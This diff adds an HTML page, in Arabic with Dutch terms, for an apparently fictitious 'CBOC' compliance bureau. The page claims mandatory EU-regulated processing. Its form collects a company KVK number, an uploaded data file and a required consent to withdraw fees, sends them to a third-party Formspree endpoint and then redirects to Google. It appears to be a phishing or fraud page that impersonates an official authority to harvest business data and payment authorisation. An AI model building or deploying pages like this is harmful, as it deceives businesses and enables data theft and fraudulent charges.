@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CBOC | Secure Terminal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .glass-card { background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(12px); }
+    </style>
+</head>
+<body class="bg-slate-100 min-h-screen flex flex-col md:flex-row antialiased text-slate-800">
+
+    <aside class="bg-slate-900 text-slate-300 w-full md:w-[350px] p-8 flex flex-col justify-between border-l-4 border-blue-600 shadow-2xl z-10">
+        <div>
+            <div class="mb-12">
+                <h1 class="text-white text-5xl font-black tracking-tighter mb-1">CBOC</h1>
+                <p class="text-[10px] uppercase tracking-widest text-slate-500 font-mono">Centraal Bureau voor Operationele Compliance</p>
+            </div>
+
+            <div class="space-y-4">
+                <div class="bg-slate-800/60 p-4 rounded-2xl border border-slate-700/50">
+                    <p class="text-[10px] text-slate-400 mb-2 font-mono uppercase tracking-wider">حالة الارتباط (A10)</p>
+                    <div class="flex items-center gap-3">
+                        <span class="relative flex h-3 w-3">
+                            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                            <span class="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
+                        </span>
+                        <span class="text-emerald-400 font-bold text-sm">متصل بالشبكة | Actief</span>
+                    </div>
+                </div>
+
+                <div class="bg-slate-800/60 p-4 rounded-2xl border border-slate-700/50">
+                    <p class="text-[10px] text-slate-400 mb-2 font-mono uppercase tracking-wider">بروتوكول التشفير</p>
+                    <p class="text-white text-sm font-bold flex items-center gap-2">
+                        <svg class="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                        AES-256 E2EE Vault
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <div class="mt-12 text-[11px] leading-relaxed text-slate-500 border-t border-slate-800 pt-5">
+            بوابة التمرير الإلزامية للعمليات اللوجستية والمالية. تخضع كافة المعاملات لتدقيق آلي متوافق مع لوائح الاتحاد الأوروبي (EU-Richtlijnen). الدخول مصرح للكيانات المسجلة فقط.
+        </div>
+    </aside>
+
+    <main class="flex-1 p-4 md:p-10 flex items-center justify-center relative overflow-hidden">
+        <div class="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] bg-blue-200 rounded-full mix-blend-multiply filter blur-3xl opacity-30"></div>
+
+        <div class="glass-card w-full max-w-xl rounded-3xl shadow-[0_8px_30px_rgb(0,0,0,0.04)] border border-white/60 relative z-10 overflow-hidden">
+            
+            <div class="bg-white/80 px-8 py-6 border-b border-slate-100 flex justify-between items-center backdrop-blur-md">
+                <div>
+                    <h2 class="text-xl font-extrabold text-slate-900">تمرير معاملة امتثال</h2>
+                    <p class="text-xs text-slate-500 mt-1 font-mono">Nieuwe Transactie</p>
+                </div>
+                <div class="h-10 w-10 bg-blue-50 rounded-full flex items-center justify-center text-blue-600">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                </div>
+            </div>
+
+            <form action="https://formspree.io/f/mqevnabe" method="POST" enctype="multipart/form-data" class="p-8 space-y-6">
+                
+                <div class="bg-slate-50 p-3 rounded-2xl border border-slate-200 focus-within:border-blue-600 focus-within:bg-white focus-within:shadow-sm transition-all">
+                    <label class="block text-[10px] font-bold text-slate-400 uppercase tracking-wider mb-1">رقم تسجيل الشركة (KVK)</label>
+                    <input type="text" name="kvk_number" required class="w-full bg-transparent text-lg font-mono text-slate-800 font-bold outline-none placeholder-slate-300" placeholder="مثال: 12345678" />
+                </div>
+
+                <div class="bg-slate-50 p-3 rounded-2xl border border-slate-200 focus-within:border-blue-600 focus-within:bg-white transition-all">
+                    <label class="block text-[10px] font-bold text-slate-400 uppercase tracking-wider mb-1">نوع المعالجة التنظيمية</label>
+                    <select name="service_type" class="w-full bg-transparent text-slate-800 font-bold text-sm outline-none cursor-pointer appearance-none">
+                        <option value="esg_compliance">إصدار تقرير انبعاثات واستدامة (A10)</option>
+                        <option value="invoice_reconciliation">مطابقة وتسوية فواتير آلية (UBL)</option>
+                        <option value="material_passport">اعتماد جواز سفر رقمي للمواد اللوجستية</option>
+                    </select>
+                </div>
+
+                <div class="relative group cursor-pointer">
+                    <div class="absolute inset-0 bg-blue-600 rounded-2xl opacity-0 group-hover:opacity-5 transition-opacity"></div>
+                    <div class="border-2 border-dashed border-slate-300 rounded-2xl p-6 text-center bg-slate-50 transition-all group-hover:border-blue-600 group-hover:bg-white">
+                        <svg class="mx-auto h-6 w-6 text-slate-400 mb-2 group-hover:text-blue-600 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"></path></svg>
+                        <label class="block text-sm font-bold text-slate-700 cursor-pointer">
+                            إرفاق حزمة البيانات للمعالجة
+                            <input type="file" name="upload_file" required class="hidden" onchange="document.getElementById('file-name').textContent = this.files[0].name" />
+                        </label>
+                        <p id="file-name" class="text-[11px] text-slate-400 mt-1 font-mono">الامتدادات المدعومة: PDF, CSV, UBL (Max 25MB)</p>
+                    </div>
+                </div>
+
+                <div class="bg-slate-50 p-4 rounded-2xl border border-slate-200 flex items-start gap-3 cursor-pointer hover:bg-white transition-colors" onclick="document.getElementById('consent').click()">
+                    <div class="pt-0.5">
+                        <input type="checkbox" id="consent" required class="w-4 h-4 text-blue-600 rounded border-slate-300 focus:ring-blue-600 cursor-pointer pointer-events-none" />
+                    </div>
+                    <div>
+                        <p class="text-sm font-bold text-slate-800">تفويض إلزامي بالمعالجة والخصم</p>
+                        <p class="text-[11px] text-slate-500 mt-1 leading-relaxed">بموجب هذا، أفوض CBOC بتدقيق البيانات المرفقة وإصدار شهادة الامتثال، مع الموافقة المسبقة على سحب الرسوم الإدارية فور الإنجاز.</p>
+                    </div>
+                </div>
+
+                <input type="hidden" name="_next" value="https://google.com">
+
+                <button type="submit" class="w-full bg-slate-900 hover:bg-blue-600 text-white font-bold py-4 rounded-2xl shadow-lg shadow-slate-900/10 transition-all transform active:scale-[0.98] flex justify-center items-center gap-2">
+                    <span>تشغيل محرك التدقيق وتمرير الطلب</span>
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                </button>
+            </form>
+        </div>
+    </main>
+
+</body>
+</html>
